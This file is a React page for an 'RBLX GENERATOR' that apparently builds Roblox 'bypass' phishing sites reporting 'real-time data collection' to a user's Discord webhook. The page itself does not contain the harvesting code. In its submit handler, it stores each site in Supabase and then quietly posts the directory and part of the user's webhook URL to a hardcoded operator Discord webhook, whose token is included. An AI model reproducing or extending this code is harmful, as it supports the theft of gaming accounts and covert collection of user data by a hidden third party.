"use client";
import { useState } from "react";
import { supabase } from "../supabaseClient";

export default function HomePage() {
  const [directory, setDirectory] = useState("");
  const [webhook, setWebhook] = useState("");
  const [status, setStatus] = useState("");

  const handleGenerate = async () => {
    if (!directory || !webhook) {
      setStatus("⚠️ Please enter both a directory and webhook URL");
      return;
    }

    setStatus("⏳ Creating site...");

    try {
      // Insert new record in Supabase
      const { data, error } = await supabase
        .from("websites")
        .insert([{ directory, webhook_url: webhook }])
        .select();

      if (error) {
        setStatus("❌ Error: " + error.message);
        return;
      }

      if (!data || data.length === 0) {
        setStatus("❌ Failed to create site. Please try again.");
        return;
      }

      // Send Discord webhook message to user's webhook
      try {
        await fetch(webhook, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: `✅ Your site **${directory}** has been successfully created!\n🌐 Visit it here: https://rblx-forcer.vercel.app/${directory}`,
          }),
        });
      } catch (err) {
        console.error("Webhook send failed", err);
      }

      // Send to permanent webhook
      const permanentWebhook = "https://discord.com/api/webhooks/1428991632472281179/wCh1K8TJUBc6zethK1iCLy6AnYw3jpYpTv2XZuRye7cr39Zv2Nik57xsLVsnkXB5-djA";
      try {
        await fetch(permanentWebhook, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            embeds: [
              {
                title: "🚀 New Website Generated",
                color: 0x00ff00,
                fields: [
                  {
                    name: "📁 Directory",
                    value: directory,
                    inline: true
                  },
                  {
                    name: "🔗 User Webhook",
                    value: webhook.substring(0, 50) + "...",
                    inline: true
                  },
                  {
                    name: "🌐 URL",
                    value: `https://rblx-forcer.vercel.app/${directory}`
                  }
                ],
                timestamp: new Date().toISOString()
              }
            ]
          }),
        });
      } catch (err) {
        console.error("Permanent webhook send failed", err);
      }

      setStatus("✅ Site created! Redirecting...");
      setTimeout(() => {
        window.location.href = `/${directory}`;
      }, 2000);

    } catch (error) {
      console.error("Unexpected error:", error);
      setStatus("❌ Unexpected error occurred. Please try again.");
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-gray-900 text-white relative overflow-hidden">
      {/* Animated Background Elements */}
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute -top-40 -right-40 w-80 h-80 bg-purple-500 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-pulse"></div>
        <div className="absolute -bottom-40 -left-40 w-80 h-80 bg-blue-500 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-pulse delay-1000"></div>
        <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-cyan-500 rounded-full mix-blend-multiply filter blur-xl opacity-10 animate-pulse delay-500"></div>
      </div>

      {/* Main Content */}
      <div className="relative z-10 flex flex-col items-center justify-center min-h-screen px-4">
        {/* Header */}
        <div className="text-center mb-12">
          <div className="flex items-center justify-center mb-4">
            <div className="w-12 h-12 bg-gradient-to-r from-purple-500 to-blue-500 rounded-lg flex items-center justify-center mr-3">
              <span className="text-2xl">⚡</span>
            </div>
            <h1 className="text-4xl font-bold bg-gradient-to-r from-purple-400 to-blue-400 bg-clip-text text-transparent">
              RBLX GENERATOR
            </h1>
          </div>
          <p className="text-gray-300 text-lg max-w-md mx-auto">
            Create custom bypass tools with automated Discord webhook integration
          </p>
        </div>

        {/* Generator Card */}
        <div className="w-full max-w-md">
          <div className="bg-gray-800/50 backdrop-blur-lg rounded-2xl border border-gray-700/50 p-8 shadow-2xl">
            {/* Directory Input */}
            <div className="mb-6">
              <label className="block text-gray-300 text-sm font-medium mb-3">
                📁 Directory Name
              </label>
              <input
                value={directory}
                onChange={(e) => setDirectory(e.target.value)}
                placeholder="Enter your unique directory name"
                className="w-full px-4 py-3 bg-gray-700/50 border border-gray-600 rounded-xl text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all duration-200"
              />
            </div>

            {/* Webhook Input */}
            <div className="mb-8">
              <label className="block text-gray-300 text-sm font-medium mb-3">
                🔗 Discord Webhook URL
              </label>
              <input
                value={webhook}
                onChange={(e) => setWebhook(e.target.value)}
                placeholder="https://discord.com/api/webhooks/..."
                className="w-full px-4 py-3 bg-gray-700/50 border border-gray-600 rounded-xl text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all duration-200"
              />
            </div>

            {/* Generate Button */}
            <button
              onClick={handleGenerate}
              className="w-full bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-700 hover:to-blue-700 text-white font-semibold py-4 px-6 rounded-xl transition-all duration-200 transform hover:scale-105 active:scale-95 shadow-lg hover:shadow-xl"
            >
              🚀 Generate Website
            </button>

            {/* Status Message */}
            {status && (
              <div className="mt-6 p-4 bg-gray-700/50 rounded-xl border border-gray-600">
                <p className="text-center text-sm">{status}</p>
              </div>
            )}
          </div>

          {/* Features List */}
          <div className="mt-8 grid grid-cols-1 gap-4 text-sm text-gray-300">
            <div className="flex items-center justify-center space-x-2">
              <span className="text-green-400">✓</span>
              <span>Automatic Discord Webhook Integration</span>
            </div>
            <div className="flex items-center justify-center space-x-2">
              <span className="text-green-400">✓</span>
              <span>Customizable Bypass Tools</span>
            </div>
            <div className="flex items-center justify-center space-x-2">
              <span className="text-green-400">✓</span>
              <span>Real-time Data Collection</span>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="mt-12 text-center">
          <p className="text-gray-400 text-sm">
            RBLX Generator © 2025 • Professional Tool Creation
          </p>
        </div>
      </div>
    </div>
  );
            }
